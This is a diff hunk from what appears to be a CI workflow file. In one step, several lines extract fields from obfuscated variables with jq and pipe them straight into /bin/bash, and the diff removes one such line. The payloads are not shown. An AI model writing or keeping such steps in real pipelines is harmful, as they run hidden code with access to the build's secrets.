@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$knxc038" | jq -r .ytci89 | /bin/bash
           echo $wa5 | jq -r .z14896 | /bin/bash
           echo $wnu5 | jq -r .s4694 | /bin/bash
-          echo $poe4470 | jq -r .xol19299 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
